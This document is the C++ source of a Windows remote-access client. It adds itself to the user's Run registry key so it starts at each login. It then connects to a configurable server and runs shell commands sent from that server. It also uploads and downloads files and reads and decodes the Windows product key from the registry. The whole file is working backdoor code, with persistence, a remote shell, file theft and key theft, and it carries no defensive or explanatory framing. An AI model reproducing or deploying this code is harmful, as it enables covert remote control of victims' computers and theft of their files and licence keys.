#include <iostream>
#include <fstream>
#include <string>
#include <thread>
#include <chrono>
#include <vector>
#include <windows.h>
#include <winsock2.h>
#include <iphlpapi.h> // For network statistics
#include <psapi.h>
#include <lmcons.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Iphlpapi.lib")

#define SERVER_IP "127.0.0.1" // Update with the server's IP
#define SERVER_PORT 9999
#define BUFFER_SIZE 4096

std::string getWindowsKey() {
    try {
        HKEY hKey;
        if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion"), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
            throw std::runtime_error("Error opening registry key.");

        BYTE data[256] = { 0 };
        DWORD dataSize = sizeof(data);
        if (RegQueryValueEx(hKey, TEXT("DigitalProductId"), nullptr, nullptr, data, &dataSize) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            throw std::runtime_error("Error retrieving 'DigitalProductId'.");
        }

        RegCloseKey(hKey);

        const char keyChars[] = "BCDFGHJKMPQRTVWXY2346789";
        std::string decodedKey;
        int keyIndex = 0;

        for (int i = 24; i >= 0; i--) {
            int current = 0;
            for (int j = 14; j >= 0; j--) {
                current = current * 256 + data[j];
                data[j] = current / 24;
                current %= 24;
            }
            decodedKey = keyChars[current] + decodedKey;

            if (i % 5 == 0 && i != 0)
                decodedKey = "-" + decodedKey;
        }

        return decodedKey;
    }
    catch (const std::exception& e) {
        return std::string("Error retrieving Windows key: ") + e.what();
    }
}

void addToStartup() {
    try {
        char exePath[MAX_PATH];
        if (GetModuleFileName(nullptr, exePath, MAX_PATH) == 0)
            throw std::runtime_error("Failed to retrieve executable path.");

        HKEY hKey;
        if (RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS)
            throw std::runtime_error("Failed to open registry key for startup.");

        if (RegSetValueEx(hKey, TEXT("CppClient"), 0, REG_SZ, (BYTE*)exePath, strlen(exePath) + 1) != ERROR_SUCCESS) {
            RegCloseKey(hKey);
            throw std::runtime_error("Failed to add to startup.");
        }

        RegCloseKey(hKey);
        std::cout << "[INFO] Client added to startup successfully.\n";
    }
    catch (const std::exception& e) {
        std::cerr << "[ERROR] Failed to add to startup: " << e.what() << "\n";
    }
}

void uploadFile(SOCKET clientSocket, const std::string& filepath) {
    std::ifstream file(filepath, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "[ERROR] File '" << filepath << "' does not exist.\n";
        return;
    }

    std::string filename = filepath.substr(filepath.find_last_of("/\\") + 1);
    std::string command = "UPLOAD:" + filename;
    send(clientSocket, command.c_str(), command.size(), 0);

    char buffer[BUFFER_SIZE];
    while (file.read(buffer, sizeof(buffer))) {
        send(clientSocket, buffer, file.gcount(), 0);
    }

    send(clientSocket, "EOF", 3, 0); // Indicate end of file transfer
    file.close();
    std::cout << "[INFO] File '" << filename << "' uploaded successfully.\n";
}

void downloadFile(SOCKET clientSocket, const std::string& filename) {
    std::string command = "DOWNLOAD:" + filename;
    send(clientSocket, command.c_str(), command.size(), 0);

    std::ofstream file("downloaded_" + filename, std::ios::binary);
    if (!file.is_open()) {
        std::cerr << "[ERROR] Failed to create file for download.\n";
        return;
    }

    char buffer[BUFFER_SIZE];
    while (true) {
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0);
        if (bytesReceived <= 0 || (bytesReceived == 3 && std::string(buffer, 3) == "EOF"))
            break;

        file.write(buffer, bytesReceived);
    }

    file.close();
    std::cout << "[INFO] File '" << filename << "' downloaded successfully.\n";
}

std::pair<double, double> getNetworkSpeed() {
    PMIB_IFTABLE pIfTable;
    DWORD dwSize = 0;
    DWORD dwRetVal = 0;

    pIfTable = (MIB_IFTABLE*)malloc(sizeof(MIB_IFTABLE));
    if (pIfTable == nullptr) {
        std::cerr << "[ERROR] Memory allocation failed for network statistics.\n";
        return {0.0, 0.0};
    }

    if (GetIfTable(pIfTable, &dwSize, 0) == ERROR_INSUFFICIENT_BUFFER) {
        free(pIfTable);
        pIfTable = (MIB_IFTABLE*)malloc(dwSize);
        if (pIfTable == nullptr) {
            std::cerr << "[ERROR] Memory allocation failed for network statistics.\n";
            return {0.0, 0.0};
        }
    }

    if ((dwRetVal = GetIfTable(pIfTable, &dwSize, 0)) == NO_ERROR) {
        ULONG64 sentBytesStart = 0;
        ULONG64 recvBytesStart = 0;

        for (DWORD i = 0; i < pIfTable->dwNumEntries; i++) {
            sentBytesStart += pIfTable->table[i].dwOutOctets;
            recvBytesStart += pIfTable->table[i].dwInOctets;
        }

        std::this_thread::sleep_for(std::chrono::seconds(1));

        if ((dwRetVal = GetIfTable(pIfTable, &dwSize, 0)) == NO_ERROR) {
            ULONG64 sentBytesEnd = 0;
            ULONG64 recvBytesEnd = 0;

            for (DWORD i = 0; i < pIfTable->dwNumEntries; i++) {
                sentBytesEnd += pIfTable->table[i].dwOutOctets;
                recvBytesEnd += pIfTable->table[i].dwInOctets;
            }

            double sentSpeedKBps = (sentBytesEnd - sentBytesStart) / 1024.0;
            double recvSpeedKBps = (recvBytesEnd - recvBytesStart) / 1024.0;

            free(pIfTable);
            return {sentSpeedKBps, recvSpeedKBps};
        }
    }

    free(pIfTable);
    return {0.0, 0.0};
}

void handleServerCommands(SOCKET clientSocket) {
    char commandBuffer[BUFFER_SIZE];
    while (true) {
        int received = recv(clientSocket, commandBuffer, sizeof(commandBuffer), 0);
        if (received <= 0) {
            std::cerr << "[ERROR] Connection lost.\n";
            return;
        }

        std::string command(commandBuffer, received);
        if (command == "exit") {
            break;
        }
        else if (command == "get_key") {
            std::string key = getWindowsKey();
            send(clientSocket, key.c_str(), key.size(), 0);
        }
        else if (command.rfind("shell:", 0) == 0) {
            std::string shellCommand = command.substr(6);
            char buffer[128];
            std::string result;

            FILE* pipe = _popen(shellCommand.c_str(), "r");
            if (!pipe) {
                result = "Error executing shell command.";
            }
            else {
                while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
                    result += buffer;
                }
                _pclose(pipe);
            }

            send(clientSocket, result.c_str(), result.size(), 0);
        }
        else if (command.rfind("upload:", 0) == 0) {
            std::string filepath = command.substr(7);
            uploadFile(clientSocket, filepath);
        }
        else if (command.rfind("download:", 0) == 0) {
            std::string filename = command.substr(9);
            downloadFile(clientSocket, filename);
        }
        else if (command == "get_speed") {
            auto [sentSpeed, recvSpeed] = getNetworkSpeed();
            std::string speedMessage = "Speed: " + std::to_string(sentSpeed) + " KB/s up, " + std::to_string(recvSpeed) + " KB/s down";
            send(clientSocket, speedMessage.c_str(), speedMessage.size(), 0);
        }
    }
}

void mainLoop() {
    addToStartup();

    while (true) {
        try {
            WSADATA wsaData;
            WSAStartup(MAKEWORD(2, 2), &wsaData);

            SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
            if (clientSocket == INVALID_SOCKET)
                throw std::runtime_error("Failed to create socket.");

            sockaddr_in serverAddr = {};
            serverAddr.sin_family = AF_INET;
            serverAddr.sin_port = htons(SERVER_PORT);
            serverAddr.sin_addr.s_addr = inet_addr(SERVER_IP);

            if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
                throw std::runtime_error("Failed to connect to server.");

            char osDetails[128];
            DWORD size = sizeof(osDetails);
            GetComputerName(osDetails, &size);
            send(clientSocket, osDetails, size, 0);

            handleServerCommands(clientSocket);

            closesocket(clientSocket);
            WSACleanup();
        }
        catch (const std::exception& e) {
            std::cerr << "[ERROR] " << e.what() << ". Reconnecting in 5 seconds...\n";
            std::this_thread::sleep_for(std::chrono::seconds(5));
        }
    }
}

int main() {
    mainLoop();
    return 0;
}
